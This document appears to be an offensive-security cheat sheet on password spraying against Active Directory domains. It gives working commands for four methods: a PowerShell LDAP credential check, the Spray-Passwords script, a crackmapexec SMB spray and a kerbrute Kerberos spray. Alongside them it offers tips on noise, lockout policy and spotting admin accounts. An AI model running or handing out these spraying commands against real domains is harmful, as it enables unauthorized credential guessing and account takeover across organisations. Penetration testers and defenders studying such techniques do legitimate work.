Enumerate account policy:

net accounts

---------------
### Manual LDAP Password Attack:
- Local method
- Low and slow attack method
- Run lines separately or as a script
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "<user>", "<password>")
```
- If credentials are correct the object creation is successful
--------------
### Automatic LDAP Attack with Spray-Passwords:
- https://github.com/ZilentJack/Spray-Passwords
- Does not require any admin access.
- Generates a lot of traffic and is not opsec safe
- Usage:
```
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin

#Multiple passwords: -Pass 'Password1,Password2'
#Download wordlist: -Url <url>
```
--------------
### SMB Password Attack with crackmapexec:
- Remote method
- Crackmap does not take password policy into account so be cautious
- Traditional attack approach in AD
- Drawback that full SMB connection has to be made for every try
- Very noisy and quite slow
```bash
sudo crackmapexec smb <ip-on-domain> -u users.txt -p 'Nexus123!' -d <domain> --continue-on-success
```
- "Pwn3d!" indicates admin user!
----------
### Kerberos TGT Attack with kerbrute:
- Cross-platform method
- If username and password are correct a cached Kerberos ticket is obtained.
- Only uses two UDP frames every try (only AS-REQ).
- Local usage:
```powershell
.\kerbrute_windows_amd64.exe passwordspray -d <domain> .\usernames.txt "password123!"
```
- If receives network error make sure usernames file is of ANSI encoding.
